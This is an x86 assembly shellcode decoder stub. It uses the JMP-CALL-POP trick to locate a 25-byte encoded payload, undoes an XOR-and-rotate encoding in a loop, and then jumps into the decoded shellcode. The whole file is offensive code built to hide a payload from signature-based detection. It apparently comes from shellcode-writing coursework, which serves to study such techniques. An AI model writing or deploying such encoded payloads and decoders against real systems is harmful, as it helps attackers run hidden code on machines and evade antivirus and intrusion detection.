global _start

_start:
 jmp short get_addr

prep_decode:
 pop esi                 ; address now in esi
 xor ecx, ecx
 mov cl, len         ; shellcode length was counter

decode:
 
; we decoded by using functions in backward order

 xor byte [esi], 0x32     ; xor with the key
 ror byte [esi], 4        ; rotate right 4 positions (opposite operation to encoding) 
 inc esi                 ; next byte
 loop decode            ; until cl is zero

 jmp short sc            ; jump to the original shellcode


get_addr:
 call prep_decode
 
 sc: db 0x21,0x3e,0x37,0xb4,0xd4,0xc0,0x05,0xb4,0xb4,0xc0,0xc0,0x14,0xa4,0xaa,0x0c,0x37,0xaa,0x1c,0x07,0xaa,0x2c,0x39,0x82,0xee,0x3a
 len equ $-sc:
